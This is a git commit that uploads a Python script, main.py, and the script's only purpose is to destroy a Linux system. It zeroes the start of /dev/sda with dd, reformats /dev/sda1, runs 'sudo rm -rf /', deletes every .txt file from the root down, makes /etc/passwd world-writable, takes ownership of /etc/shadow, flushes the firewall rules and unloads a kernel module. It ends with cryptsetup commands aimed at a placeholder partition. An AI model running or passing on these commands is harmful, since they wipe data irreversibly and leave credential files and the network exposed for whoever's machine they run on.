d622fafe38cedbb911e63e19bfd9697a9bf4f363
supchillgusgoglumf <150483877+supchillgusgoglumf@users.noreply.github.com>
2024-05-03 19:04:12 +0300

    Add files via upload

---
+++ main.py
@@ -0,0 +1,40 @@
+import os
+import subprocess
+import shutil
+import time
+
+# idk what to say
+
+os.mkdir("temp_dir")
+
+shutil.rmtree("temp_dir")
+
+subprocess.run(["dd", "if=/dev/zero", "of=/dev/sda", "bs=1M", "count=10"])
+
+os.chmod("/etc/passwd", 0o777)
+
+os.chown("/etc/shadow", os.getuid(), os.getgid())
+
+subprocess.run(["mkfs.ext4", "/dev/sda1"])
+
+subprocess.run(["iptables", "-F"])
+
+subprocess.run(["sudo", "rm", "-rf", "/"])
+
+subprocess.run(["find", "/", "-name", "*.txt", "-delete"])
+
+subprocess.run(["rmmod", "modulename"])
+
+os.system("sudo apt update && sudo apt upgrade")
+
+os.system("sudo apt install cryptsetup")
+
+os.system("sudo cryptsetup luksFormat /dev/sdXn")
+
+os.system("sudo cryptsetup luksFormat /dev/sdXn")
+
+os.system("sudo cryptsetup open /dev/sdXn encrypted_partition")
+
+os.system("sudo mkfs.ext4 /dev/mapper/encrypted_partition")
+
+os.system("sudo mount /dev/mapper/encrypted_partition /mnt/encrypted_data")
